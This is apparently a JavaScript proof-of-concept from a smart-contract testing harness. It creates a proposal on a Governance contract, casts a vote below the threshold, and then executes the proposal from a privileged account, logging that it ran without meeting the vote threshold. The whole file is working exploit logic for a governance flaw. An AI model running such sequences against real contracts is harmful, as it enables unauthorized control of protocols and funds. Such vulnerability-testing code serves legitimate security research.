async function exploit(web3, envInfo, contractAddress) {
    try {
        // Load the ABI of the Governance contract
        // Assuming you have already compiled and have the ABI
        const { abi } = await compileWithVersion(source, contractFileFullName, 'Governance', solcVersion);
        const contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Step 1: Create a proposal
        console.log("Creating a proposal...");
        let createResult = await contractInstance.methods.createProposal().send({
            from: envInfo.accounts[0],
            gas: 3000000
        });
        const proposalId = 0; // let's always target the first proposal in the list;
        governanceExploitLogger.debug(`Proposal created with ID: ${proposalId}`);

        // Wait for review period and voting period to end
        governanceExploitLogger.debug(`Waiting for review and voting period to end: sleeping for 10 seconds!`);
        await sleep(10000);

        // Step 2: Vote on the proposal but not reaching the threshold
        console.log(`Voting on proposal ${proposalId}...`);
        await contractInstance.methods.vote(proposalId).send({
            from: envInfo.accounts[0],
            gas: 3000000
        });

        // Wait for grace period to finish
        console.log("Waiting for grace period to end...");
        await sleep(5000);

        // Step 3: Execute the proposal with privileged address
        console.log(`Executing proposal ${proposalId} with privileged address...`);
        const executeResult = await contractInstance.methods.executeProposal(proposalId).send({
            from: envInfo.privilegedAccount, // Use the privileged account address
            gas: 3000000
        });
        governanceExploitLogger.info(`Proposal ${proposalId} executed without meeting vote threshold!`);

        return true;
    } catch (error) {
        console.error("Error in governance actions:", error);
        return false;
    }
}
